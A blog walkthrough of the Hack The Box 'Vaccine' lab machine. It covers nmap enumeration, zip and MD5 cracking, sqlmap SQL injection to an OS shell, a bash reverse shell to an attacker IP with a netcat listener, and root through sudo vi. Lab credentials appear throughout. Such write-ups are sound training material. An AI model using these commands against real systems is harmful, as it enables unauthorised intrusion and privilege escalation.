---
title: "Writeup: Vaccine"
date: 2021-01-01T11:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - vaccine
  - update
  - Linux
  - fcrackzip
  - FTP
  - crackstation
  - password
  - sqlmap
  - su
  - shell
  - PE
  - vi
---

Here are notes from the named target:

**Enumeration**

NMAP

```yaml
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p$ports 10.10.10.46
 
 tarting Nmap 7.91 ( https://nmap.org ) at 2021-01-01 15:57 EST
Nmap scan report for 10.10.10.46
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.60 seconds
```

So Linux server target has 3 services 

1. FTP
2. SSH (We will use this for shell once we get a user and pass)
3. HTTP

First I want to activally connect to the 3 services:

*HTTP*
browser > 10.10.10.46 > MegaCorp Login Page - try previous accounts - 
admin - MEGACORP_4dm1n!!
robert - M3g4C0rpUs3r!

Neither worked!!

See if any info on versions of FTP and SSH:

*FTP*

Tried anonymous login but that failed - )-:
Tried nmap scan for FTP backdoor

```yaml
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.46                                      1 ⨯ 1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-01 16:25 EST
Nmap scan report for 10.10.10.46
Host is up (0.065s latency).

PORT   STATE SERVICE
21/tcp open  ftp

```

No known vulns for this version of vsFTP 3.0.3, SSH or Apache versions listed - use searchsploit - also no results

```yaml
┌──(kali㉿kali)-[~]
└─$ searchsploit vsftpd 3.0.3 -w                                                                 1 ⚙
Exploits: No Results
Shellcodes: No Results
Papers: No Results
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ searchsploit vsftpd -w                                                                       1 ⚙
-------------------------------------------------------- --------------------------------------------
 Exploit Title                                          |  URL
-------------------------------------------------------- --------------------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Cons | https://www.exploit-db.com/exploits/5814
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Serv | https://www.exploit-db.com/exploits/31818
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Serv | https://www.exploit-db.com/exploits/31819
vsftpd 2.3.2 - Denial of Service                        | https://www.exploit-db.com/exploits/16270
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | https://www.exploit-db.com/exploits/17491
-------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ searchsploit OpenSSH 8.0p1 -w                                                                1 ⚙

Exploits: No Results
Shellcodes: No Results
Papers: No Results
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ searchsploit Apache httpd 2.4.41 -w                                                          1 ⚙

Exploits: No Results
Shellcodes: No Results
Papers: No Results
                                                                                                     
┌──(kali㉿kali)-[~]
└─$                 
```

Take a look at the writeup and see that it references an account and password from Target "Oopsie" the filezilla account mentioned in bugreport 2 or 3 anyway i did not follow that so did not have it in my list of accounts so peeked and here it is:

```yaml
The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server.
```

***lessons learned*** is do post exploit recon for user names and passwords:

Logged in and used FTP GET command to download the file that was there "backup.zip" and use find command to see where it was downloaded to:

```yaml
find / -type f -name backup.zip 2>/dev/null  
```

cat the file to show it is PK zip and contains a file "index.php" in it abut may hav other files

```yaml
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ cat backup.zip                                                                               3 ⚙
PK     "WCP�A:�"
        index.phpUT     ��7^��7^ux
```

Use "unzip" to decompress but file is pass protected:

```yaml
                                                                        
┌──(kali㉿kali)-[~]
└─$ unzip backup.zip                                                                             3 ⚙
Archive:  backup.zip
[backup.zip] index.php password: 

```

Going to use "fcrackzip"  -> https://installlion.com/kali/kali/main/f/fcrackzip/install/index.html

```yaml
(kali㉿kali)-[~]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip                               3 ⚙


PASSWORD FOUND!!!!: pw == 741852963

```

Note: Rockyoy may have to be unpacked on kali as it is a gz by default - This took less than one second to find the password.

Using that password back to unzip the backup.zip file and we get two files:

Cat the index.php and see a MD5 hash for a Admin password:

```yaml
PASSWORD FOUND!!!!: pw == 741852963
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ unzip backup.zip                                                                             3 ⚙
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css               
                                                                                                     
┌──(kali㉿kali)-[~]
└─$ cat index.php                                                                                3 ⚙
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
```

used [CrackStation][post-site] on the MD5 hash:

```yaml
Hash	Type	Result
2cb42f8734ea607eefed3b70af13bbd3	md5	qwerty789
Color Codes: Green: Exact match, Yellow: Partial match, Red: Not found.
```

**Login to web with "admin" and "qwerty789"

At the Catalog page search for resords with letter "a" in the search box and then go inspect element and grab the cookie id

```yaml
PHPSESSID     k3ivqlrh8f7i68p3vis6pmjsal
```

Make a sqlmap query using this information

```yaml
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=k3ivqlrh8f7i68p3vis6pmjsal"
        ___
       __H__                                                                                         
 ___ ___[,]_____ ___ ___  {1.4.12#stable}                                                            
|_ -| . [.]     | .'| . |                                                                            
|___|_  [,]_|_|_|__,|  _|                                                                            
      |_|V...       |_|   http://sqlmap.org                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:14:46 /2021-01-01/

[20:14:46] [INFO] testing connection to the target URL
[20:14:46] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:14:46] [INFO] testing if the target URL content is stable
[20:14:47] [INFO] target URL content is stable
[20:14:47] [INFO] testing if GET parameter 'search' is dynamic
[20:14:47] [INFO] GET parameter 'search' appears to be dynamic
[20:14:47] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')

```

sqlmap found database to be postgresql and several sql injection points:

this is the cool thing about sqlmap just add to the end of the connection string the following "--os-shell" and you have a shell to work with on the target server
```yaml
┌──(kali㉿kali)-[~]
└─$ sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=k3ivqlrh8f7i68p3vis6pmjsal" --os-shell
.
.
.
---
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] n
[20:26:49] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[20:26:49] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[20:26:49] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
os-shell> 

os-shell> uname -a
do you want to retrieve the command standard output? [Y/n/a] n
[20:30:50] [INFO] retrieved: 'Linux vaccine 5.3.0-29-generic #31-Ubuntu SMP Fri Jan 17 17:27:26 UT...
os-shell> 

```

As we now have a shell on the target we can also use net cat locally and set up a listener
then open a reverse shell back to us from the sqlmap shell:

In a new term...

```yaml
nc -nlvp 4321
```

In the sqlmap terminal enter this at your os-shell prompt:

```yaml
bash -c 'bash -i >& /dev/tcp/10.10.14.87/4321 0>&1'
.
.
.
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] n
[20:26:49] [WARNING] turning off pre-connect mechanism because of con
[20:26:49] [CRITICAL] connection reset to the target URL. sqlmap is g
[20:26:49] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) gro
os-shell> uname -a
do you want to retrieve the command standard output? [Y/n/a] n
[20:30:50] [INFO] retrieved: 'Linux vaccine 5.3.0-29-generic #31-Ubun

os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.87/4321 0>&1'
do you want to retrieve the command standard output? [Y/n/a] n
```
In the nc term we catch the reverse shell:

```yaml
└─$ nc -nlvp 4321                                                                                1 ⨯
listening on [any] 4321 ...
connect to [10.10.14.87] from (UNKNOWN) [10.10.10.46] 39840
bash: cannot set terminal process group (5248): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ ls
ls
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot

```

upgrade to the tty shell

```yaml
SHELL=/bin/bash script -q /dev/null
```

Look aroung and find "dashboard.php' in the /var/www/html folder that has a password for the postgres user:
```yaml
 try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }
```

Use the user account postgres and password P@s5w0rd! to log into the server SSh service

```yaml
┌──(kali㉿kali)-[~]
└─$ ssh postgres@10.10.10.46                                                                   255 ⨯
postgres@10.10.10.46's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-29-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 02 Jan 2021 02:06:52 AM UTC

  System load:  0.0                Processes:             179
  Usage of /:   32.0% of 19.56GB   Users logged in:       0
  Memory usage: 18%                IP address for ens160: 10.10.10.46
  Swap usage:   0%


47 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

postgres@vaccine:~$ ls
11  user.txt
postgres@vaccine:~$ 
             
```

Turns out that is not the correct user.txt but the user account and password for postgres can be used to see privs

SSH Server

Login with this creds 'user=postgres password=P@s5w0rd!'

```yaml
┌──(kali㉿kali)-[~]
└─$ ssh postgres@10.10.10.46                                     1 ⚙
postgres@10.10.10.46's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-29-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 02 Jan 2021 08:42:36 AM UTC

  System load:  0.0                Processes:             180
  Usage of /:   32.0% of 19.56GB   Users logged in:       0
  Memory usage: 18%                IP address for ens160: 10.10.10.46
  Swap usage:   0%


47 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sat Jan  2 07:22:44 2021 from 10.10.14.135
postgres@vaccine:~$ 

```
This password can be used to view the user's sudo privileges. *sudo -l*

```yaml
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: <enter password>
Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**VI is run as root so if we open this file and then just close it with**

```yaml
:!/bin/bash
```

hit return and it closes and we are now root

```yaml
root@vaccine:/home# cd /root
root@vaccine:~# ls
pg_hba.conf  root.txt  snap
root@vaccine:~# cat root.txt
dd6e058e81426################
```









[post-site]: https://crackstation.net/
